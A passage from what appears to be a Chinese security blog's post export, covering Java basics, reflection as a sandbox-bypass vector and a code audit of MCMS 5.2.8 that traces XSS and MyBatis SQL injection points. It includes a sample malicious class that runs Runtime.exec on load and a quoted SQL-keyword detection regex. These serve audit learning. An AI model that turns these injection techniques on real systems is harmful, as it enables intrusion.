class="string">&quot;error&quot;</span></span><br></pre></td></tr></table></figure><h2 id="文件加密"><a href="#文件加密" class="headerlink" title="文件加密"></a>文件加密</h2><p>尝试进行流式加密发现太麻烦了 直接将文件整个加密成新文件之后传输新文件</p><h2 id="sockets-代理"><a href="#sockets-代理" class="headerlink" title="sockets 代理"></a>sockets 代理</h2><p>这块主要就是维护相应的链接</p>]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> burpsuite </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【Java代码审计】Java Servlet</title>
      <link href="/2024/11/12/WebSecurity/codeaudit/javaservlet/"/>
      <url>/2024/11/12/WebSecurity/codeaudit/javaservlet/</url>
      
        <content type="html"><![CDATA[<p><img src="/2024/11/12/WebSecurity/codeaudit/javaservlet/image.png" alt="Servlet配置基于Web.xml"><br><img src="/2024/11/12/WebSecurity/codeaudit/javaservlet/image-1.png" alt="Servlet配置基于注解方式"><br><img src="/2024/11/12/WebSecurity/codeaudit/javaservlet/image-2.png" alt="Servlet配置基于注解方式"><br><img src="/2024/11/12/WebSecurity/codeaudit/javaservlet/image-3.png" alt="Servlet工作流程"><br><img src="/2024/11/12/WebSecurity/codeaudit/javaservlet/image-4.png" alt="Servlet init接口"><br><img src="/2024/11/12/WebSecurity/codeaudit/javaservlet/image-5.png" alt="Servlet service接口"></p>]]></content>
      
      
      <categories>
          
          <category> Code Audit </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【Java开发】java相关的小知识点</title>
      <link href="/2024/11/12/code/javacode/"/>
      <url>/2024/11/12/code/javacode/</url>
      
        <content type="html"><![CDATA[<h2 id="值传递和引用传递"><a href="#值传递和引用传递" class="headerlink" title="值传递和引用传递"></a>值传递和引用传递</h2><p>Java 有 8 种基本数据类型，分别是 int、long、byte、short、float、double 、char 和 boolean</p><ul><li>Java 中的参数传递是按值传递的。</li><li>如果参数是基本类型，传递的是基本类型的字面量值的拷贝。</li><li>如果参数是引用类型，传递的是引用的对象在堆中地址的拷贝。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ReferenceTypeDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;二哥&quot;</span>;</span><br><span class="line">        modify(name);</span><br><span class="line">        System.out.println(name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">modify</span><span class="params">(String name1)</span> &#123;</span><br><span class="line">        name1 = <span class="string">&quot;三妹&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 Java 中，<code>String</code> 是不可变的（immutable）。当你把 <code>name</code> 变量传递给 <code>modify</code> 方法时，实际上是将 <code>name</code> 的值（即字符串 <code>&quot;二哥&quot;</code>)的引用复制给了 <code>modify</code> 方法中的参数 <code>name1</code>。因此，<code>name1</code> 和 <code>name</code> 都指向 <code>&quot;二哥&quot;</code> 这个字符串。<br>在 <code>modify</code> 方法中，<code>name1 = &quot;三妹&quot;;</code> 只是将 <code>name1</code> 变量指向了一个新的字符串 <code>&quot;三妹&quot;</code>，并没有改变原来的 <code>name</code> 变量的内容。<code>name</code> 仍然指向 <code>&quot;二哥&quot;</code>，因此在 <code>main</code> 方法中输出 <code>name</code> 时，仍然会输出 <code>&quot;二哥&quot;</code>。</p><h2 id="Java反射"><a href="#Java反射" class="headerlink" title="Java反射"></a>Java反射</h2><ul><li>开发通用框架：像 Spring，为了保持通用性，通过配置文件来加载不同的对象，调用不同的方法。</li><li>动态代理：在面向切面编程中，需要拦截特定的方法，就会选择动态代理的方式，而动态代理的底层技术就是反射。</li><li>注解：注解本身只是起到一个标记符的作用，它需要利用发射机制，根据标记符去执行特定的行为。<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ReflectionDemo1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException &#123;</span><br><span class="line">        <span class="type">Writer</span> <span class="variable">writer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Writer</span>();</span><br><span class="line">        writer.setName(<span class="string">&quot;沉默王二&quot;</span>);</span><br><span class="line">        System.out.println(writer.getName());</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;com.itwanger.s39.Writer&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> clazz.getConstructor();</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> constructor.newInstance();</span><br><span class="line"></span><br><span class="line">        <span class="type">Method</span> <span class="variable">setNameMethod</span> <span class="operator">=</span> clazz.getMethod(<span class="string">&quot;setName&quot;</span>, String.class);</span><br><span class="line">        setNameMethod.invoke(object, <span class="string">&quot;沉默王二&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">getNameMethod</span> <span class="operator">=</span> clazz.getMethod(<span class="string">&quot;getName&quot;</span>);</span><br><span class="line">        System.out.println(getNameMethod.invoke(object));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> Code </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【代码审计】Java代码审计反射篇</title>
      <link href="/2024/11/12/WebSecurity/codeaudit/javasec/"/>
      <url>/2024/11/12/WebSecurity/codeaudit/javasec/</url>
      
        <content type="html"><![CDATA[<p>「Java安全」<a href="https://pan.quark.cn/s/56c5a74545e7">https://pan.quark.cn/s/56c5a74545e7</a><br>Java的安全问题常常从反序列化漏洞谈起，而反序列化漏洞又与反射紧密相关。反射是Java中的一个强大功能，它允许程序在运行时动态地加载类、调用方法、访问字段等。通过反射，Java能够将这种静态语言赋予动态特性。<br>“动态特性”是指代码在运行时可以改变其行为。例如，通过改变代码中的某些变量，可能会导致代码的执行结果发生变化。虽然Java不像PHP那样灵活，但通过反射，Java也能够提供一定的动态特性。<br>反射在安全研究中常用于绕过沙盒（如限制某些类的访问）。例如，通过反射可以绕过输入限制来加载并执行潜在危险的类。假设你只能获取一个<code>Integer</code>类型的输入，但可以利用反射加载并执行<code>Runtime</code>类中的命令。</p><h2 id="第一部分"><a href="#第一部分" class="headerlink" title="第一部分"></a>第一部分</h2><h3 id="反射的核心功能"><a href="#反射的核心功能" class="headerlink" title="反射的核心功能"></a>反射的核心功能</h3><p>反射是通过以下几种方法实现的：</p><ol><li><p><strong>获取类</strong>：</p><ul><li><code>Class.forName(className)</code>：通过类名加载类。</li><li><code>obj.getClass()</code>：通过已实例化对象来获取其类。</li><li><code>Test.class</code>：如果类已经加载，可以直接通过<code>.class</code>属性来获取。</li></ul></li><li><p><strong>实例化对象</strong>：</p><ul><li><code>clazz.newInstance()</code>：通过反射创建类的实例。</li></ul></li><li><p><strong>获取方法并执行</strong>：</p><ul><li><code>clazz.getMethod(methodName)</code>：通过反射获取类中的方法。</li><li><code>method.invoke(clazz.newInstance())</code>：调用获取到的方法。</li></ul></li></ol><p><code>Class.forName</code> 的详细解析<br><code>Class.forName</code>方法有两个重载版本：</p><ul><li><code>Class&lt;?&gt; forName(String name)</code>：根据类名加载类。</li><li><code>Class&lt;?&gt; forName(String name, boolean initialize, ClassLoader loader)</code>：同样加载类，但可以指定是否初始化类，并通过指定<code>ClassLoader</code>来加载类。</li></ul><p>第⼆个参数 initialize 常常被⼈人误解，我看到勾陈安全实验室有篇讲反射机制的⽂文章（<a href="http://www.polaris-lab.com/index.php/archives/450/%EF%BC%89%E2%BE%A5%E9%87%8C%E9%87%8C%E8%AF%B4%E5%88%B0%EF%BC%9A">http://www.polaris-lab.com/index.php/archives/450/）⾥里里说到：</a><br>注意，有一点很有趣，使⽤用功能”.class”来创建Class对象的引⽤用时，不会⾃自动初始化该Class对象，使用forName()会自动初始化该Class对象<br><img src="/2024/11/12/WebSecurity/codeaudit/javasec/image-6.png"><br>图中有说“构造函数，初始化时执⾏”，其实在 forName 的时候，构造函数并不不会执行，即使我们设置 initialize&#x3D;true 。<br>那么这个初始化究竟指什什么呢？可以将这个“初始化”理理解为类的初始化。<code>initialize</code>参数决定是否初始化类。对于一些类的加载，它可能会触发类的静态初始化块。例如，以下类的静态块会在类加载时执行：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TrainPrint</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.out.printf(<span class="string">&quot;Static initial %s\n&quot;</span>, TrainPrint.class);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line">        System.out.printf(<span class="string">&quot;Empty block initial %s\n&quot;</span>, <span class="built_in">this</span>.getClass());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">TrainPrint</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.printf(<span class="string">&quot;Initial %s\n&quot;</span>, <span class="built_in">this</span>.getClass());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>加载这个类时，首先会执行<code>static</code>块，然后是实例块，最后是构造函数。</p><p>总结来说就是:loadClass()方法只对类进行加载，不会对类进行初始化。Class.forName 会默认对类进行初始化。当对类进行初始化时，静态的代码块就会得到执行，而代码块和构造函数则需要适合的类实例化才能得到执行.</p><h3 id="反射绕过沙盒的例子"><a href="#反射绕过沙盒的例子" class="headerlink" title="反射绕过沙盒的例子"></a>反射绕过沙盒的例子</h3><p>关于绕沙盒，之前Code-Breaking 2018作者出了了⼀一道SpEL的题⽬目，分享⼀一篇第三⽅方Writeup：<a href="http://rui0.cn/archives/1015">http://rui0.cn/archives/1015</a></p><p>假设你有一个可以控制输入的函数，传入一个类名并通过反射加载这个类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">ref</span><span class="params">(String name)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    Class.forName(name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果<code>name</code>参数由攻击者控制，他们可以利用反射加载恶意类并执行其中的静态初始化块。例如，以下恶意类在静态块中执行<code>Runtime.exec()</code>命令来创建文件：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">import</span> java.lang.Process;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TouchFile</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Runtime</span> <span class="variable">rt</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">            String[] commands = &#123;<span class="string">&quot;touch&quot;</span>, <span class="string">&quot;/tmp/success&quot;</span>&#125;;</span><br><span class="line">            <span class="type">Process</span> <span class="variable">pc</span> <span class="operator">=</span> rt.exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// do nothing</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个恶意类可能通过<code>Class.forName</code>触发，导致在目标系统上执行<code>touch /tmp/success</code>命令，从而创建一个文件。</p><p>OPNSense freeBSD 映做 </p><p><img src="/2024/11/12/WebSecurity/codeaudit/javasec/image-2.png"><br><img src="/2024/11/12/WebSecurity/codeaudit/javasec/image-3.png"><br><img src="/2024/11/12/WebSecurity/codeaudit/javasec/image-4.png"><br><img src="/2024/11/12/WebSecurity/codeaudit/javasec/image-5.png"><br>Filter<br>javasec-vuls-struts2<br>JEESNS回答处存在XSS漏洞<br><img src="/2024/11/12/WebSecurity/codeaudit/javasec/image.png"><br><img src="/2024/11/12/WebSecurity/codeaudit/javasec/image-1.png"></p>]]></content>
      
      
      <categories>
          
          <category> Code Audit </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【代码审计】Java MCMS 框架 5.2.8</title>
      <link href="/2024/11/08/WebSecurity/codeaudit/javacodemcms/"/>
      <url>/2024/11/08/WebSecurity/codeaudit/javacodemcms/</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.freebuf.com/articles/web/360757.html">https://www.freebuf.com/articles/web/360757.html</a></p><h2 id="项目说明"><a href="#项目说明" class="headerlink" title="项目说明"></a>项目说明</h2><p><a href="https://gitee.com/mingSoft/MCMS">https://gitee.com/mingSoft/MCMS</a><br>网上看了下这套代码的漏洞比较多，可以用来练练手</p><table><thead><tr><th align="left">技术</th><th align="left">名称</th><th align="left">官网</th></tr></thead><tbody><tr><td align="left">Spring Framework</td><td align="left">容器</td><td align="left"><a href="http://projects.spring.io/spring-framework/">http://projects.spring.io/spring-framework</a></td></tr><tr><td align="left">Spring Boot</td><td align="left">MVC框架</td><td align="left"><a href="https://spring.io/projects/spring-boot">https://spring.io/projects/spring-boot</a></td></tr><tr><td align="left">Apache Shiro</td><td align="left">安全框架</td><td align="left"><a href="http://shiro.apache.org/">http://shiro.apache.org</a></td></tr><tr><td align="left">Spring session</td><td align="left">分布式Session管理</td><td align="left"><a href="http://projects.spring.io/spring-session">http://projects.spring.io/spring-session</a></td></tr><tr><td align="left">MyBatis</td><td align="left">ORM框架</td><td align="left"><a href="http://www.mybatis.org/mybatis-3/zh/index.html">http://www.mybatis.org</a></td></tr><tr><td align="left">Freemarker</td><td align="left">视图框架</td><td align="left"><a href="http://freemarker.foofun.cn/">http://freemarker.foofun.cn</a></td></tr><tr><td align="left">PageHelper</td><td align="left">MyBatis分页插件</td><td align="left"><a href="http://git.oschina.net/free/Mybatis_PageHelper">http://git.oschina.net/free/Mybatis_PageHelper</a></td></tr><tr><td align="left">Log4J</td><td align="left">日志组件</td><td align="left"><a href="http://logging.apache.org/">http://logging.apache.org</a></td></tr><tr><td align="left">Maven</td><td align="left">项目构建</td><td align="left"><a href="http://maven.apache.org/">http://maven.apache.org</a></td></tr><tr><td align="left">Elasticsearch</td><td align="left">分布式搜索引擎</td><td align="left"><a href="https://www.elastic.co/">https://www.elastic.co</a></td></tr><tr><td align="left">Redis</td><td align="left">分布式缓存数据库</td><td align="left"><a href="https://redis.io/">https://redis.io</a></td></tr><tr><td align="left">hutool</td><td align="left">工具类</td><td align="left"><a href="http://hutool.mydoc.io/">http://hutool.mydoc.io</a></td></tr></tbody></table><table><thead><tr><th align="left">技术</th><th align="left">常见安全问题</th><th align="left">防范措施</th></tr></thead><tbody><tr><td align="left"><strong>Spring Framework</strong></td><td align="left">配置漏洞（如未正确配置 CSRF、CORS），数据暴露风险</td><td align="left">确保正确配置 CSRF 和 CORS，启用 Spring Security 进行鉴权，避免不必要的 Bean 暴露</td></tr><tr><td align="left"><strong>Spring Boot</strong></td><td align="left">默认配置可能暴露管理端点（如 <code>/actuator</code>），可能引发信息泄露</td><td align="left">在 <code>application.properties</code> 中禁用生产环境的管理端点，限制访问权限</td></tr><tr><td align="left"><strong>Apache Shiro</strong></td><td align="left">鉴权绕过（特别是路径拦截不当）、密码加密强度不足</td><td align="left">确保路径拦截规则严格且测试充分，加密配置中使用高强度散列算法</td></tr><tr><td align="left"><strong>Spring Session</strong></td><td align="left">会话固定攻击（Session Fixation）、会话劫持</td><td align="left">使用 <code>https</code> 保护传输，加密存储敏感会话信息，定期刷新会话</td></tr><tr><td align="left"><strong>MyBatis</strong></td><td align="left">SQL 注入</td><td align="left">使用 <code>#&#123;&#125;</code> 语法传递参数，避免直接拼接 SQL，定期检查 Mapper 文件</td></tr><tr><td align="left"><strong>Freemarker</strong></td><td align="left">模板注入（Template Injection）</td><td align="left">避免使用用户输入直接作为模板变量，开启输出转义</td></tr><tr><td align="left"><strong>PageHelper</strong></td><td align="left">分页参数未验证，可能导致注入</td><td align="left">校验分页参数的合法性，设置最大分页限制</td></tr><tr><td align="left"><strong>Log4J</strong></td><td align="left">日志注入，JNDI 注入风险（Log4Shell）</td><td align="left">避免日志记录用户直接输入内容，升级到安全版本（Log4j2 最新版）</td></tr><tr><td align="left"><strong>Maven</strong></td><td align="left">使用的依赖库可能包含已知漏洞</td><td align="left">定期检查依赖库版本，使用 Maven Security Scanner 检测</td></tr><tr><td align="left"><strong>Elasticsearch</strong></td><td align="left">默认配置未认证，可能被未授权访问</td><td align="left">设置访问控制策略，加密存储，禁用默认的 <code>_cat</code> 等敏感接口</td></tr><tr><td align="left"><strong>Redis</strong></td><td align="left">未授权访问，持久化数据泄露风险</td><td align="left">禁用不必要的外部网络连接，配置密码和 IP 白名单</td></tr><tr><td align="left"><strong>Hutool</strong></td><td align="left">安全性依赖具体工具函数的实现</td><td align="left">使用时需验证 Hutool 工具类的输入输出是否合法，避免直接处理用户输入</td></tr></tbody></table><h2 id="前台XSS"><a href="#前台XSS" class="headerlink" title="前台XSS"></a>前台XSS</h2><p>其实感觉也不算是漏洞，只是做给自己看的<br><img src="/2024/11/08/WebSecurity/codeaudit/javacodemcms/image.png"><br>主要原因是上面在报错返回时，将恶意代码也添加在了content当中一起返回<br><img src="/2024/11/08/WebSecurity/codeaudit/javacodemcms/image-1.png" alt="可以看到下面的调用栈信息"><br>这里可以跟进分析下是怎么判断的：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">clean</span><span class="params">(String name, String content)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> Jsoup.clean(content, <span class="string">&quot;&quot;</span>, whitelist, outputSettings);</span><br><span class="line">        result = Parser.unescapeEntities(result, <span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">if</span> (content.equals(result) &amp;&amp; SqlInjectionUtil.isSqlValid(content)) &#123;</span><br><span class="line">            <span class="keyword">return</span> content;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">uri</span> <span class="operator">=</span> SpringUtil.getRequest().getRequestURI();</span><br><span class="line">            LOGGER.debug(<span class="string">&quot;接口不符合XSS规则:&#123;&#125;&quot;</span>, uri);</span><br><span class="line">            LOGGER.debug(<span class="string">&quot;参数名:&#123;&#125; 参数值:&#123;&#125;&quot;</span>, name, content);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">BusinessException</span>(<span class="string">&quot;参数异常:&quot;</span> + content);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>在上面的 Jsoup.clean 中就已经清除了，Jsoup.clean 是 Jsoup 库的一部分，Jsoup 是一个开源的 Java 库，专门用于解析、清理和操作 HTML。Jsoup 可以从 HTML 中移除不安全的内容，因此常用于防止 XSS 攻击。<br><a href="https://blog.csdn.net/qq_33915826/article/details/104484336">使用Jsoup.clean消除不受信任的HTML (防止XSS攻击)</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">clean</span><span class="params">(String bodyHtml, String baseUri, Whitelist whitelist, Document.OutputSettings outputSettings)</span> &#123;</span><br><span class="line">        <span class="type">Document</span> <span class="variable">dirty</span> <span class="operator">=</span> parseBodyFragment(bodyHtml, baseUri);</span><br><span class="line">        <span class="type">Cleaner</span> <span class="variable">cleaner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Cleaner</span>(whitelist);</span><br><span class="line">        <span class="type">Document</span> <span class="variable">clean</span> <span class="operator">=</span> cleaner.clean(dirty);</span><br><span class="line">        clean.outputSettings(outputSettings);</span><br><span class="line">        <span class="keyword">return</span> clean.body().html();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p> bodyHtml 字符串解析为一个 Document 对象，称为 dirty（“未清理”文档）。<br><img src="/2024/11/08/WebSecurity/codeaudit/javacodemcms/image-2.png"><br><img src="/2024/11/08/WebSecurity/codeaudit/javacodemcms/image-3.png" alt="这里clean之后就已经不包含恶意代码了"><br>注意到前面的代码中还有对sql代码的过滤，跟进去看到了规则如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Pattern</span> <span class="variable">sqlPattern</span> <span class="operator">=</span> Pattern.compile(<span class="string">&quot;(?:&#x27;)|(?:--)|(/\\*(?:.|[\\n\\r])*?\\*/)|(\\b(select|update|and|or|delete|insert|trancate|char|substr|ascii|declare|chr|mid|exec|count|master|into|drop|execute)\\b)&quot;</span>, <span class="number">2</span>);</span><br></pre></td></tr></table></figure><h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><p>前面已经知道了MCMS使用mybaits作为持久层框架，可以分析相应的映射文件，在其中查找使用<code>$</code>拼接的参数。除此之外还有种漏洞思路，<code>&lt;include&gt;&lt;/include&gt;</code>标签，会将一段复用的SQL代码拼接入当前语句中。</p><h3 id="查询分析"><a href="#查询分析" class="headerlink" title="$ 查询分析"></a>$ 查询分析</h3><p>在<code>IContentDao.xml</code>中找到了用到了，这个先暂时放着</p><h3 id="分析"><a href="#分析" class="headerlink" title="&lt;include&gt;&lt;/include&gt;分析"></a><code>&lt;include&gt;&lt;/include&gt;</code>分析</h3><p>三个xml文件中都包含有下面的这个：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">include</span> <span class="attr">refid</span>=<span class="string">&quot;net.mingsoft.base.dao.IBaseDao.sqlWhere&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br></pre></td></tr></table></figure><p>进入到这个类里面看看到底是什么<br><img src="/2024/11/08/WebSecurity/codeaudit/javacodemcms/image-4.png"><br>可以看到其中有大量的$，主要是用到了<code>$&#123;item.field&#125;</code>，分析得到这个是来自于 sqlWhereList ，其中的field变量是可能存在的注入点。<br>接下来看看这个是否可控，返回去查看方法调用的点，在ICategoryDao.xml，找select id&#x3D;”query”对应的接口，没有找到，进入到其基类中查找，找到了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">IBaseDao</span>&lt;E&gt; <span class="keyword">extends</span> <span class="title class_">BaseMapper</span>&lt;E&gt; &#123;</span><br><span class="line">...</span><br><span class="line">    List&lt;E&gt; <span class="title function_">query</span><span class="params">(BaseEntity entity)</span>;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>进一步找query的实现类，有三个，但只有一个接受参数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// net/mingsoft/base/biz/impl/BaseBizImpl.java</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">BaseBizImpl</span>&lt;M <span class="keyword">extends</span> <span class="title class_">BaseMapper</span>&lt;T&gt;,T&gt; <span class="keyword">extends</span> <span class="title class_">ServiceImpl</span>&lt;M,T&gt; <span class="keyword">implements</span> <span class="title class_">IBaseBiz</span>&lt;T&gt; &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> List&lt;T&gt; <span class="title function_">query</span><span class="params">(BaseEntity entity)</span> &#123;</span><br><span class="line"><span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line"><span class="keyword">return</span> getDao().query(entity);</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来再找找看哪里用了<br><img src="/2024/11/08/WebSecurity/codeaudit/javacodemcms/image-5.png"><br>跟进<code>net/mingsoft/cms/action/CategoryAction.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Api(tags=&#123;&quot;后端-内容模块接口&quot;&#125;)</span></span><br><span class="line"><span class="meta">@Controller(&quot;cmsCategoryAction&quot;)</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/$&#123;ms.manager.path&#125;/cms/category&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CategoryAction</span> <span class="keyword">extends</span> <span class="title class_">BaseAction</span> &#123;</span><br><span class="line">    ......</span><br><span class="line"><span class="meta">@RequestMapping(value=&quot;/list&quot;,method = &#123;RequestMethod.GET, RequestMethod.POST&#125;)</span></span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="meta">@RequiresPermissions(&quot;cms:category:view&quot;)</span></span><br><span class="line"><span class="keyword">public</span> ResultData <span class="title function_">list</span><span class="params">(<span class="meta">@ModelAttribute</span> <span class="meta">@ApiIgnore</span> CategoryEntity category)</span> &#123;</span><br><span class="line">BasicUtil.startPage();</span><br><span class="line"><span class="type">List</span> <span class="variable">categoryList</span> <span class="operator">=</span> categoryBiz.query(category);</span><br><span class="line"><span class="keyword">return</span> ResultData.build().success(<span class="keyword">new</span> <span class="title class_">EUListBean</span>(categoryList,(<span class="type">int</span>) BasicUtil.endPage(categoryList).getTotal()));</span><br><span class="line">&#125;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>存在外部可访问接口，<code>@RequestMapping(&quot;/$&#123;ms.manager.path&#125;/cms/category&quot;)</code>，<code>$&#123;ms.manager.path&#125;</code>在配置中为ms，找到具体的应用点，传入的参数是 CategoryEntity 类型的：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span 